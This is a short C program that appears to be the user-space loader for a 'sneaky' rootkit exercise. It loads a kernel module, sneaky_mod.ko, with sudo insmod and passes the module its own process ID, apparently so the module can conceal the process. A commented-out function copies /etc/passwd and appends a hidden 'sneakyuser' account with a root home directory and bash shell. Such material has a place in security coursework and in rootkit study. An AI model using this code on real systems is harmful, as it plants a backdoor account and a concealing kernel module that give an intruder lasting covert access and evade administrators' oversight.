#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>

/*
void pwdswap(void) {
  system("sudo cp /etc/passwd /tmp/passwd");
  //system("sudo cp /tmp/passwd /tmp/passwd_phony");
  FILE * passwd = fopen("/etc/passwd", "at+");
  if (passwd == NULL) {
    perror("File Opening");
    return;
  }
  fwrite("sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n",50,1,passwd);
  fclose(passwd);

  //print out appended passwd file
  //system("cat /etc/passwd");

}

*/
int main(void) {

  
  //get process ID
  int PID;
  PID = getpid();
  char num[20];
  //get PID as string
  sprintf(num, "%d", PID);
  char str[100];
  strcpy(str, "sudo insmod sneaky_mod.ko");
  strcat(str, " pid=");
  strcat(str, num);

  //Print Process ID
  printf("My process ID is: %d\n", PID);

  //load kernel module
  system(str);

  
  //Release kernel module 
  //  system("sudo rmmod sneaky_mod.ko");

  
  return EXIT_SUCCESS;

}
